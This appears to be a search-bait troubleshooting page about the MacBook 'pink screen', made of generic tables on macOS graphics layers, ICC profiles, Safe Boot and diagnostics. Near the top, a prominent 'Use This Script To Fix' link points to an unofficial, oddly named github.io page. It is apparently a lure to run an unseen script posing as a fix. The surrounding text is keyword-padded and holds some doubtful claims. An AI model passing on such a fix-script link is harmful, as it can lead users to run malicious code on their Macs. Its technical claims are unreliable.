# MacBook Pink Screen

> **Applies to:** macOS 10.13 High Sierra — macOS 26.5 Tahoe · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## MacBook Pink Screen — GPU Color Pipeline Architecture, Framebuffer Channel Errors, and ICC Profile Corruption

> **[Use This Script To Fix - Click Here](https://error-number-472173.github.io/.github/mac-pink-screen)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.

**What's actually responsible for Mac Pink Screen, in order of architectural impact:**

- Hardware communication failure at the `IOKit` driver layer or display signal path — detectable through Apple Diagnostics and `ioreg` independently of the user-visible symptom
- GPU driver or Metal rendering pipeline instability introduced by a macOS update or conflicting third-party kernel extension
- Software configuration stored in property list (`.plist`) files that has become inconsistent across a macOS version transition
- Third-party kernel extensions (`kext`) or System Extensions interfering with the macOS subsystem responsible for Mac Pink Screen
- `launchd`-managed daemon processes in a failed or restart-loop state due to dependency failures at boot
- Privacy permission entries in the TCC (Transparency, Consent, and Control) database blocking subsystem access at the framework layer

---

## Internal macOS Architecture for Mac Pink Screen

macOS organizes all system functionality into discrete architectural layers. Mac Pink Screen involves the following components:

| Layer | Component | Relevance to Mac Pink Screen |
|---|---|---|
| Hardware | Logic board, GPU, display panel, sensors | Physical signal source and rendering output |
| Firmware | SMC, EFI, GPU firmware | Low-level initialization and power state management |
| Kernel | XNU, IOKit, GPU kexts / System Extensions | Hardware abstraction and driver communication |
| Graphics stack | Metal, CoreDisplay, WindowServer | GPU command submission and display composition |
| System daemons | `launchd`-managed services | Background process lifecycle management |
| Configuration | `/Library/Preferences/`, `~/Library/Preferences/` | Stored settings, ICC profiles, and device state |
| User interface | System Settings pane | User-facing configuration surface |

A failure at any of these layers produces the visible symptom of Mac Pink Screen. The layer where the failure occurs determines the appropriate diagnostic approach — hardware-layer failures require IOKit inspection or Apple Diagnostics, while configuration-layer failures require plist and profile analysis.

---

## APFS Volume Structure and Configuration File Architecture

Since macOS 10.13, all Mac startup volumes use **APFS (Apple File System)** organized into a container with multiple volumes sharing a unified free space pool:

| APFS Volume | Contents | Relevance to Mac Pink Screen |
|---|---|---|
| Macintosh HD (System) | Sealed, read-only system files and frameworks | Cryptographically verified at each boot by SSV hash tree |
| Macintosh HD — Data | User data, apps, preferences, ICC profiles, caches | Writable; source of most configuration-related failures |
| VM | Swap files, `sleepimage` | Memory pressure and GPU memory paging |
| Preboot | Boot metadata, firmware staging | Boot process and recovery orchestration |
| Recovery | recoveryOS, Disk Utility | Repair and reinstall environment |

The **Sealed System Volume (SSV)** introduced in macOS 11 Big Sur adds a Merkle hash tree over every file in the system volume. Corruption of any system file — including GPU drivers and display frameworks — is detected at the next boot and remediated automatically. Configuration and profile failures in the writable Data volume are not covered by SSV and persist until explicitly addressed.

---

## GPU and Display Architecture on macOS

The macOS graphics stack consists of several distinct layers between application rendering and physical display output:

| Stack Layer | Component | Failure Mode |
|---|---|---|
| Application | Metal API, OpenGL (deprecated) | Rendering errors in specific apps |
| GPU driver | `AGXFamily` (Apple Silicon), `AMDRadeon` / `Intel` kexts (Intel) | Driver crashes, pipeline stalls |
| WindowServer | `SkyLight` framework, display compositor | Screen freeze, flicker, color corruption |
| CoreDisplay | `DisplayServices` daemon, display link | Refresh rate errors, signal loss |
| Display controller | Retina scaler, backlight PWM | Brightness anomalies, panel-level artifacts |
| Physical signal | eDP / LVDS internal, HDMI / DP external | Color channel errors, signal loss |

Color anomalies — including pink, purple, or green tints — typically originate at the GPU framebuffer level or the physical signal path. A framebuffer-level color error affects all content uniformly, while a signal path error may affect only portions of the display or specific refresh cycles.

---

## ICC Color Profile Architecture

macOS applies **ICC (International Color Consortium) color profiles** to every display to calibrate color output to that display's measured gamut. These profiles are stored in:

- `/Library/ColorSync/Profiles/` — system-wide profiles including Apple factory calibrations
- `~/Library/ColorSync/Profiles/` — user-installed or custom profiles
- Display-specific profiles referenced in `/Library/Preferences/com.apple.ColorSync.plist`

A corrupted ICC profile assigned to the primary display can produce persistent color tinting — including pink or purple casts — across all content, because the color transformation is applied at the compositor level before output to the display hardware. The tint persists in screenshots (confirming a software-layer cause) if the color transformation occurs before the screenshot capture point, or is absent in screenshots (confirming a hardware cause) if the signal corruption occurs after the framebuffer.

---

## Property List Corruption and Daemon State Failures

macOS stores all user-modifiable configuration in **property list (`.plist`) files** in the APFS Data volume. A write interrupted by a kernel panic or forced shutdown can produce a file that parses as syntactically valid but contains semantically incorrect data. The responsible daemon reads the corrupted values at next boot and behaves incorrectly as a result.

The `launchd` process manager (PID 1) automatically restarts a crashed daemon according to its `ThrottleInterval` setting. A daemon crashing on each restart due to a corrupted preference file creates a **restart loop** — observable in Console.app as rapid repeated launch/crash/relaunch entries for the daemon's process name.

---

## Diagnostic Data Sources

| Tool | Access | What It Reveals for Mac Pink Screen |
|---|---|---|
| Console.app | Applications → Utilities | Daemon crash logs, GPU driver errors, WindowServer failures |
| Activity Monitor | Applications → Utilities | GPU process CPU usage, WindowServer memory consumption |
| System Information | About This Mac → System Report | GPU hardware inventory, display signal type, driver version |
| Disk Utility First Aid | Applications → Utilities or Recovery | APFS container and volume integrity errors |
| Apple Diagnostics | Hold **D** at boot | Hardware-level GPU and display fault codes |
| `ioreg -l` | Terminal | Full IOKit registry including GPU and display controller properties |
| ColorSync Utility | Applications → Utilities | ICC profile assignments and color space configuration |
| `log` CLI | Terminal | Structured Unified Log query for GPU driver and display subsystem events |

---

## Safe Boot Diagnostic Environment

Safe Boot starts macOS with all third-party kernel extensions and System Extensions disabled, most LaunchAgents suppressed, and `fsck_apfs` run automatically on the startup volume. Safe Boot also resets the display configuration to system defaults, removing any corrupted ICC profile assignments:

- **Intel Mac:** Hold **Shift** immediately after pressing the power button
- **Apple Silicon Mac:** Hold **Power** until "Loading startup options" appears, then hold **Shift** while clicking Continue

If Mac Pink Screen does not occur in Safe Boot, the cause is categorically in third-party software, accumulated user configuration, or a corrupted display profile — not in GPU hardware or core display controller components.

---

## New User Account Isolation

Creating a temporary standard user account (System Settings → Users & Groups → Add Account) and reproducing the conditions that trigger Mac Pink Screen:

- **Problem absent in new account** → cause is in the original user's `~/Library/` directory: display profiles, preferences, or ColorSync configuration
- **Problem present in new account** → cause is system-wide: GPU driver, system-level display configuration, or hardware

---

## macOS Version Architecture Context

| macOS Version | Darwin Kernel | Relevant Architectural Change |
|---|---|---|
| macOS 12 Monterey | Darwin 21 | ProMotion display support; Metal 3 API additions |
| macOS 13 Ventura | Darwin 22 | Stage Manager compositor changes; Display link refactor |
| macOS 14 Sonoma | Darwin 23 | HDR display management updates; GPU power state changes |
| macOS 15 Sequoia | Darwin 24 | Revised WindowServer compositor architecture |
| macOS 26 Tahoe | Darwin 25 | Updated GPU driver entitlement model |

---

## Hardware vs Software Decision Matrix

| Evidence | Diagnostic Conclusion |
|---|---|
| Problem absent in Safe Boot | Third-party extension, login item, or corrupted ICC profile |
| Problem absent in new user account | User-level ColorSync profile or display preference corruption |
| Tint present in screenshots | Software-layer color transformation (ICC or GPU driver) |
| Tint absent in screenshots | Hardware signal path corruption after framebuffer |
| Apple Diagnostics reports GPU fault | Hardware GPU failure confirmed |
| Problem began after macOS update | GPU driver compatibility issue with new kernel version |
| Problem only with external display | Display cable, adapter, or external display hardware |

---

*This reference covers Mac Pink Screen as observed on macOS 10.13 High Sierra through macOS 26.5 Tahoe on Intel x86_64 and Apple Silicon ARM64 hardware.*
